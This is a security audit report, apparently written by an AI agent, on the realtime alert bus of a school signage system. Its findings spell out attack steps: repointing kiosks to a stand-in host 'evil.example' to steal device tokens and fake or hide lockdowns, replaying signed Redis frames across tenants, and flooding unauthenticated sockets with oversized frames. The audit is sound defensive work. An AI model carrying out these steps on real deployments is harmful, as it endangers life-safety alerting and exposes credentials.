# Realtime Bus Security Audit — 2026-08-01

> **Provenance:** produced by a single Opus agent under the audit ground rules (read-only,
> evidence-with-file:line, two-methods-for-absence-claims, self-refutation before reporting).
> **Lead review status: NOT yet independently re-verified.** Findings R-01 and R-03 in
> particular carry preconditions the agent flagged as unverified — see "Not checked" at the
> bottom and the lead's note at the end of this file.

**Scope:** `apps/api/src/realtime/*`, `apps/api/src/security/ws-signature.ts` + `websocket-signer.service.ts`, `packages/ws-events/`, every production publisher onto `tenant:* | group:* | device:*`, and the player-side WS/SSE consumers in `apps/web/src/app/player/page.tsx`.

## Posture: **ADEQUATE**

The server-side core is genuinely well-built: there is **no client-initiated channel subscription anywhere** (scope is derived 100% from a DB-verified device identity), **every** production publisher signs, **every** consume path passes through one HMAC gate, and — the single most important design decision in this system — **the device-authenticated HTTPS manifest, not the realtime bus, is the sole arbiter of the lockdown/evacuate overlay** (`player/page.tsx:4126-4131`). A forged or replayed `OVERRIDE`/`ALL_CLEAR` on the bus therefore *cannot* paint or suppress a lockdown; it only triggers a re-fetch. That caps the blast radius of nearly everything below.

What keeps this from STRONG: the HMAC is **not bound to the channel it is delivered on**, so anyone with Redis `PUBLISH` can cross-post a captured signed frame into any other tenant — bypassing the gate's own stated "compromised Redis" threat model; the WebSocket server accepts **100 MiB frames from unauthenticated sockets and parses them before auth**; and the player's API root (hence its WS, SSE, manifest *and* reconcile endpoints) is settable by a URL query parameter with no allowlist.

---

## Findings

### [HIGH] R-01 — Player's entire trust anchor (WS + SSE + manifest) is repointable by a URL query parameter, with no allowlist, persisted to localStorage

**Attacker:** anyone who can cause the kiosk to load one URL — brief physical/remote access to the device, a crafted QR/shortlink handed to an operator, a malicious "setup link", or a compromised digital-signage provisioning step. No credentials needed.

**File:line:** `apps/web/src/app/player/page.tsx:598-612` (and the consumers at `:4953`, `:4817`, `:3103`)

**Evidence:**
```ts
function getApiRoot(): string {
  if (typeof window !== 'undefined') {
    const params = new URLSearchParams(window.location.search);
    const apiParam = params.get('api');
    if (apiParam) {
      // Save to localStorage so it persists across refreshes
      localStorage.setItem('edu_api_root', apiParam.replace(/\/api\/v1\/?$/, ''));
      return apiParam.replace(/\/api\/v1\/?$/, '');
    }
    const saved = localStorage.getItem('edu_api_root');
    if (saved) return saved;
  }
```
Every realtime and life-safety transport is derived from it:
```ts
const wsUrl = getApiRoot().replace(/^http/, 'ws') + '/realtime';            // :4953
const url = `${getApiRoot()}/api/v1/realtime/sse?token=${...}`;             // :4817
await fetch(`${getApiRoot()}/api/v1/emergency/messages`, {...});            // :3103  (the stranded-alert reconcile)
```
There is no scheme check, no host allowlist, and no production gate. Confirmed by reading the whole function and by a repo-wide grep for `edu_api_root`, which returns only these two lines in the player.

**Attack:**
1. Load `https://<player-host>/player?screen=<id>&api=https://evil.example` once on the kiosk (or hand an operator the link).
2. `edu_api_root` is now permanently `https://evil.example` — it survives reload, and no later code re-validates it.
3. The player opens `wss://evil.example/realtime`, sends `HELLO` with the real device JWT (**token exfiltrated**), and the attacker replies `AUTH_OK` with any `serverTime` they like (which also sets `serverClockOffsetRef`, neutralising the ±30s freshness gate).
4. The attacker serves a manifest with `isEmergency: true, emergencyType: 'LOCKDOWN'` → a **fake lockdown**, or `isEmergency: false` forever → a **real district lockdown is never displayed on this screen**, because the manifest is the sole arbiter and the attacker now *is* the manifest.
5. The attacker pushes `{type:'SOS'|'TEXT_BROADCAST'|'MEDIA_ALERT', signature:'anything', timestamp:Date.now(), eventId:<fresh uuid>, payload:{...}}` — the player never verifies the HMAC (`:5115` only checks the field is a non-empty *string*), so arbitrary text and arbitrary `mediaUrls` render full-screen. The server-side media allowlist (`emergency/media-url-guard.ts`) is bypassed because the server is bypassed. The 12s stranded-alert reconcile at `:3128` also polls the attacker's host, so it never clears.

**Impact:** full per-screen takeover — fake emergency injection *and* real-emergency suppression on every screen the attacker can get the URL onto, plus device-JWT theft.

**Fix:** gate the `api` override on `process.env.NODE_ENV !== 'production'`, or validate it against a compile-time allowlist of hosts (`NEXT_PUBLIC_API_URL` + explicit staging hosts) and require `https:`. Same treatment for the `?token=` persist at `:476-484`.

**Confidence:** certain (mechanism); likely (that a real deployment is reachable this way — depends on how the Android kiosk shell constrains its start URL, which was not audited).

**Verification methods:** full read of `getApiRoot`; repo-wide grep for `edu_api_root`; traced all three consumer call sites; read the player's WS/SSE message handlers end-to-end to confirm no independent origin/host check exists.

---

### [HIGH] R-02 — The WS HMAC does not cover the delivery channel, so a captured signed frame can be replayed onto any other tenant/group/device scope

**Attacker:** anything with `PUBLISH`/`SUBSCRIBE` on the Redis instance — the exact "compromised Redis" this gate was built to stop (`redis.service.ts:186-188`), a co-resident service on the Railway private network, or an SSRF/injection reachable from inside.

**File:line:** `apps/api/src/security/ws-signature.ts:20-30` and `:75-80`; consumed at `apps/api/src/realtime/redis.service.ts:175-203`

**Evidence:** the canonical string signed and verified contains no scope:
```ts
export interface WsCanonicalFields { eventId: string; timestamp: number; type: string; payload: unknown; }
export function wsCanonicalString(m: WsCanonicalFields): string {
  return `${m.eventId}:${m.timestamp}:${m.type}:${JSON.stringify(m.payload)}`;
}
```
…while the routing scope comes entirely from the untrusted channel name:
```ts
const channelParts = channel.split(':');
if (channelParts.length < 2) return;
const [type, id] = channelParts;
...
const verdict = verifyWsHmac(parsed, this.deviceSecret);
if (!verdict.ok) { ...; return; }
if (this.gateway) this.gateway.broadcastToScope(type, id, parsed);
if (this.sse) this.sse.broadcastToScope(type, id, parsed);
```
Freshness is a generous **120 s** window with **no nonce and no server-side per-eventId dedup**, by documented design (`ws-signature.ts:38-50, 60, 71-73`).

**Attack:**
1. Subscribe to `tenant:*` on Redis and wait for any tenant to fire a legitimate `SOS` / `TEXT_BROADCAST` / `MEDIA_ALERT` / `REFRESH_WEB`.
2. Within 120 s, `PUBLISH tenant:<victim-tenant> <the exact captured JSON>`.
3. `verifyWsHmac` passes byte-for-byte (nothing in the signature ties the frame to the originating tenant). The gate fans it out to every WS and SSE client in the victim tenant.
4. Victim screens render the other district's `SOS`/broadcast text and media full-screen. A captured tenant-scoped `REFRESH_WEB` replays as a fleet-wide reload (`page.tsx:5296` treats `scope==='tenant'` as "targets us" with **no** check that `scopeId` is our tenant).

**Impact:** cross-tenant fake alert on a whole district's screens, and cross-tenant fleet reload/OTA-check. **Not** a fake lockdown — see refutation.

**Refutation attempted / limits:** checked whether this yields a fake LOCKDOWN. It does not: the player's `OVERRIDE` handler only calls `fetchContent()` (`page.tsx:5177-5179`) and the overlay is set exclusively from the authenticated manifest (`:4126-4131`). Same for `ALL_CLEAR` — a replayed all-clear cannot suppress a real lockdown; the immediate re-fetch re-asserts it. Injected `SOS`/`TEXT_BROADCAST`/`MEDIA_ALERT` self-clear in ~24-36 s via the server reconcile at `:3094-3130`, and an *identical* replay into the *same* tenant is blocked by the player's per-eventId dedup at `:5126-5139`. So this is bounded — but it is still the designated gate failing at its designated job.

**Fix:** include the publish channel in the canonical string (`${channel}:${eventId}:${timestamp}:${type}:${payload}`) and have `handleRedisMessage` verify against the channel it actually arrived on. Sign+verify both sides in one commit. Optionally tighten `maxAgeMs` from 120 s once clock-skew telemetry supports it.

**Confidence:** certain (the signature demonstrably omits scope; the routing demonstrably comes from the channel string).

**Verification methods:** read `ws-signature.ts`, `websocket-signer.service.ts` and `ws-signature.spec.ts` in full (the spec covers tampered payload/type/secret/staleness — but has **no** cross-channel case); read `redis.service.ts` in full; enumerated all 30 `.publish(` call sites and confirmed the channel string is always constructed at the call site and never signed.

---

### [HIGH] R-03 — Unauthenticated WebSocket sockets can send 100 MiB frames that are stringified and JSON-parsed before any auth check

**Attacker:** anonymous, from the public internet. One TCP connection, no credentials.

**File:line:** `apps/api/src/realtime/realtime.gateway.ts:28`, `:67-93`

**Evidence:** the gateway is constructed with only a path —
```ts
@WebSocketGateway({ path: '/realtime' })
```
— and `@nestjs/platform-ws`'s adapter passes those options straight through (`ws-adapter.js:38-51`: `const { server, path, ...wsOptions } = options; new wsPackage.Server({ noServer: true, ...wsOptions })`), so `maxPayload` takes the library default of **104857600 bytes** (`ws@8.21.0/lib/websocket-server.js:74`). The raw handler is attached in `handleConnection`, i.e. **before** any authentication:
```ts
client.on('message', (raw: Buffer | string) => {
  try {
    const text = typeof raw === 'string' ? raw : raw.toString();
    const msg = JSON.parse(text);
```
The 10 s auth timeout (`:49-55`) closes idle unauthenticated sockets but does nothing to stop a frame that arrives inside that window. The global `ClientIpThrottlerGuard` (`app.module.ts:254-255`) is an `APP_GUARD` on the HTTP pipeline; it cannot fire here because the gateway deliberately bypasses Nest message routing (`:64-66`) and there are **zero** `@SubscribeMessage` handlers in the codebase.

**Attack:**
1. `wss://<api>/realtime` — no Origin check, no credentials required to connect.
2. Send a single ~100 MB text frame within 10 s. `ws` buffers the whole payload, `raw.toString()` allocates a ~200 MB UTF-16 string, `JSON.parse` allocates again.
3. Open N connections and repeat. Memory and event-loop pressure on the API process.
4. The same process serves `/api/v1/screens/:id/manifest` — the HTTP-polling life-safety backstop. Degrading it degrades the emergency floor for the whole fleet.

**Impact:** cheap anonymous denial of the realtime bus **and** the emergency manifest poll — i.e. fleet-wide suppression of emergency delivery, which the severity anchor rates at the top.

**Fix:** `@WebSocketGateway({ path: '/realtime', maxPayload: 64 * 1024 })` (a legitimate `HELLO`/`HEARTBEAT`/`ACK`/`TIME_PING` is a few hundred bytes). Add a cheap pre-auth guard: reject frames over ~8 KB before `toString()`, cap concurrent unauthenticated sockets per source IP, and count pre-auth frames.

**Confidence:** certain on the mechanism (default confirmed in the installed `ws` source and in the adapter source); likely on exploitability at the reported severity (the container's memory ceiling and whether Railway's edge caps WS frame size upstream were not measured — that is the one thing that could blunt it).

**Verification methods:** read the gateway in full; read `@nestjs/platform-ws/adapters/ws-adapter.js` to confirm option pass-through; grepped the installed `ws@8.21.0` source for the `maxPayload` default; grepped `apps/api/src` for `maxPayload`/`verifyClient` (none); confirmed no `@SubscribeMessage` exists so no Nest guard/pipe can intercept.

---

### [MEDIUM] R-04 — The SSE fallback tier has none of the WS path's client-side gates, and an on-path attacker can force screens onto it

**Attacker:** an on-path adversary on the school network (able to RST/block the WS upgrade), combined with any injection foothold (R-01, or TLS interception via a district MDM-installed root CA — common in K-12).

**File:line:** `apps/web/src/app/player/page.tsx:4839-4853` (and the `handle()` registrations at `:4854-4927`); contrast with the WS gates at `:5106-5140`

**Evidence:** the SSE consumer states the gap outright and implements none of the checks:
```ts
// Each Redis event type comes through as a named SSE event.
// SSE doesn't have the signed-replay protection the WS path
// uses — we trust the server-side signer for these. Auth was
// already enforced when EventSource opened.
const handle = (name: string, fn: (data: any) => void) => {
  es.addEventListener(name, (ev) => {
    try {
      const data = JSON.parse((ev as MessageEvent).data);
      fn(data?.payload || data);
```
No signature-presence check, no `timestamp` freshness check, no `eventId` dedup — versus the WS path which enforces all three for `OVERRIDE / TENANT_CHANGED / SOS / TEXT_BROADCAST / MEDIA_ALERT / ALL_CLEAR_MESSAGE`. Notably `ALL_CLEAR_MESSAGE` clears the pushed-emergency overlay on SSE with **zero** checks (`:4916`).

The downgrade ladder is deterministic and attacker-triggerable: `wsFailCountRef.current >= 3 → tryOpenSse()` (`:5415-5417`), then `sseFailCountRef.current >= 2 → engageHttpPollFallback` (`:4935-4939`). Killing the WS upgrade three times reliably lands every screen on the weaker tier.

**Attack:**
1. Block/reset the `wss://` upgrade for the target screens (proxy rule, or three forged RSTs).
2. Screens fall to SSE within ~seconds.
3. Any injected SSE frame is now accepted with no signature, no freshness bound, and no replay dedup — including an unlimited replay of one captured `ALL_CLEAR_MESSAGE` to keep an SOS/broadcast overlay permanently suppressed.

**Impact:** defence-in-depth on the emergency-message overlay drops to zero on the fallback tier, and the attacker chooses when screens land there. Capped by the fact that a network attacker still needs to break TLS or own the API root; and the lockdown overlay itself remains manifest-governed.

**Fix:** hoist the `SENSITIVE_TYPES` signature-presence + freshness + `eventId` dedup block into a shared function and call it from both `ws.onmessage` and the SSE `handle()` wrapper. (The SSE payload carries `signature`/`eventId`/`timestamp` already — `sse.service.ts:168` writes the whole verified envelope.)

**Confidence:** certain (the asymmetry is explicit in code and comment).

**Verification methods:** read both consumers line by line; enumerated the SSE `handle()` registrations and diffed the type list against the WS switch (SSE also has **no** `TENANT_CHANGED` and no `GAME_STATE`/`CTS_MANUAL_CUE` handler — a correctness asymmetry, not a security one).

---

### [MEDIUM] R-05 — `TENANT_CHANGED` is an untargeted fleet-wide unpair: the player wipes its device token without checking `payload.screenId`

**Attacker:** anyone with an injection foothold on a player's transport (R-01/R-04), or a future code change that makes the producer reachable.

**File:line:** producer `apps/api/src/screens/screens.controller.ts:1306-1311`; consumer `apps/web/src/app/player/page.tsx:5161-5175`

**Evidence:** the message is signed *with* a `screenId`, but published to the **entire previous tenant's channel**:
```ts
const signed = this.signer.signMessage('TENANT_CHANGED', {
  screenId: screen.id, previousTenantId, newTenantId: req.user.tenantId,
});
await this.redisService.publish(`tenant:${previousTenantId}`, signed);
```
The consumer never reads `screenId`:
```ts
if (msg.type === 'TENANT_CHANGED') {
  try { localStorage.removeItem('edu_device_token'); } catch {}
  try { localStorage.removeItem('edu_device_fp'); } catch {}
  try { localStorage.removeItem('edu_manifest_cache_v1'); } catch {}
  try { localStorage.removeItem('edu_emergency_cache_v1'); } catch {}
  try { navigator.serviceWorker?.controller?.postMessage({ type: 'CLEAR_CACHE', tier: 'all' }); } catch {}
  try { (window as any).EduCmsNative?.unpair?.(); } catch {}
  setActiveEmergency(null);
  setPhase('registering');
  return;
}
```
One frame → every WS-connected screen in that tenant destroys its device credential, its manifest cache, its **emergency cache**, its service-worker offline tiers, and drops to the pairing screen. Recovery requires a human at each kiosk.

**Refutation attempted (this is why it is MEDIUM, not CRITICAL):** traced whether the sole producer can actually fire. It cannot, today. `pair()` rejects a cross-tenant claim before reaching the publish:
```ts
if (screen.tenantId && screen.tenantId !== req.user.tenantId) {
  throw new HttpException({ code: 'SCREEN_ALREADY_PAIRED', ... }, HttpStatus.CONFLICT);   // :1239-1241
}
```
Past that guard, `previousTenantId` is either falsy or equal to `req.user.tenantId`, so `previousTenantId && previousTenantId !== req.user.tenantId` at `:1304` is **unreachable**. Repo-wide grep confirms `screens.controller.ts:1306` is the only producer. So there is no legitimate frame to capture and replay, and the routine-operation footgun ("re-pair one screen, unpair a district") does not currently fire.

**Impact:** latent fleet-wide de-provisioning of the life-safety channel. One relaxation of the 409 guard (a plausible product request: "let a district move a screen without a factory reset") converts it to an immediate district-wide outage with no attacker at all. Under R-01/R-04 it is available today as a single-frame kill switch per reachable screen.

**Fix:** publish to `device:<screenId>` instead of the tenant channel, **and** make the player require `msg.payload?.screenId === screenId` before the teardown. Both — either alone leaves the other half of the hazard.

**Confidence:** certain on the consumer defect; certain on the producer being currently unreachable.

**Verification methods:** read both sites in full; repo-wide grep for `TENANT_CHANGED` across `apps/api` and `apps/web`; traced the `pair()` control flow from the guard at `:1239` to the publish at `:1311`.

---

### [LOW] R-06 — Long-lived device JWT travels in the SSE query string

**Attacker:** anyone with access to reverse-proxy/platform HTTP logs, browser history on the kiosk, or a Referer leak.

**File:line:** `apps/api/src/realtime/sse.controller.ts:12`, `:39-56`; client at `apps/web/src/app/player/page.tsx:4817`

**Evidence:** `GET /api/v1/realtime/sse?token=<deviceJwt>`, with the tradeoff documented and defended at `sse.controller.ts:18-25` (EventSource cannot set headers). The player *does* redact it from its own console log (`:4818`), and `RequestLogInterceptor` only logs mutations (`security/request-log.interceptor.ts:51-54`), so the API does not log it — but Railway's platform HTTP log is outside this repo's control. Device tokens are long-lived (the gateway's own comment at `:148-152` cites a 365-day window).

**Impact:** a leaked device JWT grants read access to that tenant's realtime stream and manifest until revoked. It does **not** grant publish or fan-out capability.

**Fix:** if EventSource stays, mint a short-lived (≤5 min) single-purpose stream ticket at an authenticated POST and put *that* in the query string. Mitigating control already present: the 30 s revocation sweep (`sse.service.ts:89-92`, `:222-242`) closes a revoked stream within ~30 s.

**Confidence:** certain (design is explicit); the exposure depends on platform log retention, which was not inspected.

**Verification methods:** read the controller and its spec in full; read `request-log.interceptor.ts` in full to confirm GETs are not logged by us.

---

### [LOW] R-07 — An authenticated device can drive unbounded Redis writes via `ACK`/`HEARTBEAT`

**Attacker:** a single compromised or stolen kiosk (its device JWT).

**File:line:** `apps/api/src/realtime/realtime.gateway.ts:237-277`

**Evidence:** neither handler is rate-limited, and `HEARTBEAT` stores an attacker-controlled blob:
```ts
this.redisService.publisher.hset(`device:${ctx.deviceId}:status`,
  'lastSeen', Date.now(),
  'metrics', JSON.stringify(payload.metrics || {})
)
...
this.redisService.publish('metrics:ack', { deviceId: ctx.deviceId, ... });
```
Combined with R-03's 100 MiB frame ceiling, one device can park a ~100 MB value in Redis and re-write it at will. When Redis is down, each `ACK` instead routes through `RedisService.publish`'s direct fallback (`redis.service.ts:213-217`) → `handleRedisMessage` → HMAC failure → one `logger.warn` per ACK (log flood).

**Impact:** Redis memory pressure / log flood, degrading the realtime tier the emergency path prefers. No cross-tenant reach: the channel is the fixed literal `metrics:ack` (which the subscriber's `tenant:*|group:*|device:*` patterns do not match), and the hash key is derived from `ctx.deviceId`, never from the payload.

**Fix:** cap `payload.metrics` size (e.g. reject > 4 KB), add a per-socket token bucket on `ACK`/`HEARTBEAT`, and downgrade the fallback-path drop log to `debug`.

**Confidence:** likely (mechanism certain; impact depends on Redis sizing).

**Verification methods:** read both handlers; traced `publish('metrics:ack', …)` through both the connected and disconnected Redis branches to confirm it cannot reach `broadcastToScope` (`type === 'metrics'` matches none of the three scope tests at `:312-314`).

---

### [LOW] R-08 — `ws-signature.ts` documents an end-to-end Ed25519 player verification that does not exist

**File:line:** `apps/api/src/security/ws-signature.ts:14-18`

**Evidence:**
> "End-to-end player verification uses a separate asymmetric (Ed25519) signature — see ws-ed25519.ts — so no secret is ever shipped to a kiosk."

`ws-ed25519.ts` does not exist. `ls apps/api/src/security/` lists 24 files, none of them that; `find . -name "*ed25519*"` outside `node_modules` returns nothing; a repo-wide grep for `ed25519` hits only this comment, an aspirational comment in `player/page.tsx:5086`, and `packages/api-types/src/capability-registry.ts:130`, which states the truth correctly: *"Player-side Ed25519 device verification (ControlEnvelopeV2, EVT-001) is the multi-week hardening, **not yet built**."*

**Impact:** no direct exploit — but this is precisely the safeguard-theater pattern CLAUDE.md §21 names as a repeat failure. A reviewer or a district security questionnaire reading this header would conclude the player verifies signatures end-to-end. It does not: `page.tsx:5115` checks only that `msg.signature` is a non-empty string. That misreading is what makes R-01 and R-04 easy to under-prioritise.

**Fix:** replace the paragraph with the `capability-registry.ts:130` wording. Add the same one-line disclaimer above the player's `SENSITIVE_TYPES` block.

**Confidence:** certain (three independent absence methods).

---

### Hardening note (informational) — channel-name parsing ignores everything past the second segment

`redis.service.ts:178-180` does `const [type, id] = channel.split(':')`, so a publish to `tenant:<A>:anything` would be routed as scope `tenant:<A>`. No current publisher emits such a channel (all 30 call sites enumerated), but the gateway's own *keys* are shaped that way (`tenant:${id}:devices`, `group:${id}:devices`, `device:${id}:status`), so the collision is one careless `publish` away. Suggest rejecting channels with `channelParts.length !== 2`.

---

## What's already strong

**No client-initiated subscription exists — scope is derived entirely from a DB-verified identity.** This is the single best decision in the design and it closes the audit's "big one" outright.
- `realtime.gateway.ts:74-89` — the inbound switch accepts exactly four events (`HELLO`, `HEARTBEAT`, `ACK`, `TIME_PING`); everything else hits `default:` and is only logged. There is no `SUBSCRIBE`, no channel field, nothing a client can name.
- `realtime.gateway.ts:155-167` — after `jwt.verify`, the screen row is re-read and the **DB tenant wins over the JWT claim** (`decoded.tenantId = screen.tenantId`), with a hard reject if the JWT's tenant disagrees (`:162-165`) or the screen is gone/unpaired (`:159-161`).
- `realtime.gateway.ts:177` — `groupId` is sourced from the *live* screen row, never the token, so a stale group claim cannot be used to eavesdrop on another group.
- `realtime.gateway.ts:309-314` — fan-out matches only `ctx.tenantId` / `ctx.groupId` / `ctx.deviceId`, and skips any socket where `!ctx.isAuthenticated`.
- Confirmed by two methods: full read of the 379-line gateway, plus a repo-wide grep showing **zero** `@SubscribeMessage` handlers.

**Auth is checked before anything is honoured, and pre-auth surface is near zero.**
- `realtime.gateway.ts:49-55` — 10 s auth timeout closes silent sockets with `4001 Auth Timeout`.
- `realtime.gateway.ts:239`, `:262`, `:294` — `HEARTBEAT`, `ACK` and `TIME_PING` each begin with `if (!ctx || !ctx.isAuthenticated) return;`. A pre-auth `TIME_PING` gets **silence**, not a reply (asserted by `realtime.gateway.spec.ts:168-170`).
- `jwt.verify` runs *before* any Redis or Prisma call, so a garbage token costs no DB round-trip.

**The HMAC gate is complete on every consume path.** Verified by two independent methods — (a) repo-wide grep for `broadcastToScope`, whose only non-test callers are `redis.service.ts:202-203`, and (b) a full read of `redis.service.ts` confirming `handleRedisMessage` is the sole entry to those two calls, invoked from `subscriber.on('message')` (`:141`), `subscriber.on('pmessage')` (`:144-146`), and the Redis-down direct fallback (`:216`) — **all three** downstream of the verify at `:191-198`:
```ts
const verdict = verifyWsHmac(parsed, this.deviceSecret);
if (!verdict.ok) { this.logger.warn(`[WS] DROPPED unverified message on ${channel} ...`); return; }
```

**Every production publisher signs.** All 30 `.publish(` call sites enumerated; each of the 29 that targets `tenant:*|group:*|device:*` passes a `signMessage()` envelope (emergency ×6, screens ×12, gpio ×2, screen-groups, wedge-detector, playlists, schedules, fitness). The one unsigned publisher (`realtime.gateway.ts:264`, `metrics:ack`) targets a channel outside every psubscribe pattern and outside every scope match.

**Signature primitives are correct.** `ws-signature.ts:85-88` uses `crypto.timingSafeEqual` with an explicit length pre-check (and a comment explaining why the length check must come first). `:71-73` guards both stale **and** far-future timestamps. Units are milliseconds end to end — the previously-shipped seconds/ms bug is locked down by two regression tests (`realtime.gateway.spec.ts:394-418`, `:420-438`), and `:326-334` passes the *original signed* `timestamp`, `signature` and `eventId` through unmodified rather than re-stamping them.

**The manifest — not the bus — decides whether a lockdown is on screen.** `player/page.tsx:4126-4131`: *"Manifest is the SOLE arbiter of emergency state."* `OVERRIDE` and `ALL_CLEAR` only call `fetchContent()` (`:5177-5179`). This means a forged all-clear cannot suppress a real lockdown and a forged override cannot manufacture one — the two nightmare scenarios in the brief are structurally blocked on the bus.

**Pushed emergency messages have a server-of-record reconcile too.** `player/page.tsx:3094-3130` polls the device-authed `/api/v1/emergency/messages` every 12 s and clears a stranded `SOS`/`TEXT_BROADCAST`/`MEDIA_ALERT` after two confirmed misses — deliberately fail-safe toward over-alerting (an erroring poll leaves the alert up).

**Client-side replay defence on the WS tier.** `player/page.tsx:5106-5140` — `SENSITIVE_TYPES` must carry a `signature` field, must be within ±30 s of server-corrected time, and must have an unseen `eventId` (bounded LRU: 500 entries / 5 min).

**Revocation is enforced on both transports, in every environment, fail-closed at admission.** `realtime.gateway.ts:140-147` and `sse.controller.ts:69-76` both reject on `jwt_revoked_list` **and** on a revocation-check error. `redis.service.ts:234-276` adds a durable Postgres mirror (sha256 of the token, never the raw token) so revocation survives a Redis outage. `sse.service.ts:222-242` re-checks open streams every 30 s and closes revoked ones. `sse.controller.spec.ts:78-145` covers the revoked, non-revoked, and Redis-errors-fail-closed cases explicitly.

**`DEV_WS_ALLOW` is hard-gated, not merely documented.** `realtime.gateway.ts:120-122`: `if (token.startsWith('dev_') && !isProd && devWsAllow)` — in production the branch is skipped entirely and `dev_…` falls to `jwt.verify`, which fails. `Dockerfile:102` bakes `ENV NODE_ENV=production` into the runtime stage, so the production image cannot land in the dev branch by omission. Every use of the flag was grepped repo-wide. *One hardening note:* the check is `NODE_ENV === 'production'` rather than a denylist, so a host deployed with `NODE_ENV=staging` **and** `DEV_WS_ALLOW=true` would reopen it — two simultaneous misconfigurations, but worth an explicit boot assertion.

**Emergency publish authorisation is properly tenant-scoped.** `emergency.controller.ts:267-319` (`resolveScopeTenant`) resolves the owning tenant from the DB for group/device scopes and 403s any non-SUPER_ADMIN whose tenant does not match, before any mutation or publish. `:369` runs an https+Supabase-host allowlist on operator-supplied media URLs (`emergency/media-url-guard.ts`), and `:380-390` verifies the override's `playlistId` belongs to the same tenant.

**Device-reported GPIO cannot reach beyond its own screen.** `gpio.controller.ts:77-108` requires `decoded.kind === 'device'` **and** `decoded.sub === screenId` (with a constant-time HMAC fallback for legacy binaries), then re-reads the tenant from the DB (`:159-167`). A compromised kiosk can only self-trigger, only if `config.wiring` maps that pin (`gpio.service.ts:257-272`), and only at 10 events/min (`:238`).

**Push-health telemetry is tenant-scoped by construction.** `push-health.ts:35` (`if (!screenId || !tenantId) return;`) and `:47-50` (`updateMany({ where: { id: screenId, tenantId } })`) — a screen deleted or rebound mid-flight is a silent 0-row no-op, and every failure path is swallowed so telemetry can never break a handshake.

**Clock services are safe by construction.** `time.controller.ts` is deliberately unauthenticated but returns only `serverNow` plus a `Number()`-clamped `echo` (`:38-42`) — an inert reflection — behind a 1200/min throttle (`:36`). `time-sync.service.ts:47-49` serves a Redis-`TIME`-aligned clock so replicas agree; the sampler touches no request-path state.

**Sports deliberately has no pub/sub fan-out**, with the reasoning recorded (`sports/sports.service.ts:69-75`), and the note that any future `game:*` channel must be added to the psubscribe list *and* verified with `verifyWsHmac`. This is the right instinct written down in the right place.

**No HTML-injection sink in the player's emergency path** — zero `dangerouslySetInnerHTML` under `apps/web/src/components/player/` or `player/page.tsx`.

---

## Not checked / UNVERIFIED

- **Android kiosk shell (APK) start-URL handling.** R-01's real-world severity turns on whether the native shell pins its URL or accepts query parameters. The Kotlin/APK source was not read. If the shell pins the URL and strips params, R-01 drops to affecting only browser-based players and manual-URL kiosks.
- **Railway platform posture:** whether the edge caps WebSocket frame size (would blunt R-03), the container memory ceiling, whether Redis is network-isolated to the private network (the precondition for R-02), and platform HTTP log retention (the exposure for R-06). All outside this repo.
- **TLS/transport in the field.** Assumed `wss://`/`https://` since the URLs derive from `NEXT_PUBLIC_API_URL`. HSTS, certificate pinning in the APK, and whether districts deploy an MDM root CA that makes on-path TLS interception practical were not verified — that is the difference between "MITM is theoretical" and "MITM is a Tuesday" for R-04.
- **Load/DoS numbers.** R-03 and R-07 are reasoned from code and library defaults. Nothing was run (read-only mandate) — no measured OOM threshold, no measured connection ceiling.
- **`@nestjs/platform-ws` upgrade-path internals** beyond the adapter's server construction: its HTTP-upgrade routing was not audited for path-confusion or header-smuggling.
- **The other realtime consumers.** The player's WS/SSE handlers were audited exhaustively. `apps/web/src/components/player/CtsBridge.tsx` and the dashboard's own realtime consumers (if any) were not read; a second consumer with weaker gates would change the R-02/R-04 picture.
- **`fitness/stick-control.controller.ts:268`** publishes `STICK_COMMAND` to `tenant:${req.user.tenantId}`. Tenant scoping confirmed correct, but the controller-level guard/role decorators were **not** verified, so whether a `RESTRICTED_VIEWER` can fire it is **UNVERIFIED**. It is a device-control message, not a life-safety one.
- **Redis ACL / auth configuration.** Whether `REDIS_URL` uses a restricted ACL user (which would materially raise R-02's precondition) is deployment config not visible from the repo.

---

## Lead's note (2026-08-01)

R-01's severity hinges on a question the **next** audit slice answers directly: does the Android
shell pin its start URL? `apps/player/app/build.gradle.kts` bakes
`buildConfigField("String", "PLAYER_BASE_URL", ...)` defaulting to `https://venue-os.app/player`,
and `SafePlayerWebViewClient.kt` exists to constrain navigation — but whether `MainActivity`
appends or accepts `?api=` from an Intent extra is **unverified**. Note that `MainActivity` is
`exported="true"` with a `com.educms.player.OPEN_PLAYER` intent filter, so a malicious co-installed
app or `adb shell am start` is a plausible injection route for exactly this. Cross-reference
finding `PLAYER-SIGN-02` (shipped APKs are `debuggable="true"`) — that makes the `adb` route cheap.
